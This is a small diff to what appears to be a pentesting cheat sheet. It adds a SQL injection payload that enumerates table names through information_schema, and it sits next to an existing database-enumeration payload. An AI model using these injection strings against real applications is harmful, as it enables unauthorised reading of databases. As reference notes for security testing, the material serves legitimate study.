@@ -79,6 +79,10 @@ Database enumeration brute force attack(sin sustituir ninguno de los numeros)
 ```
 UNION SELECT 1,2,3 where database() like '%'; - --
 ```
+Tables enumeration
+```
+UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'BBDD' and table_name like '%';--
+```
 
 # Powershell
 
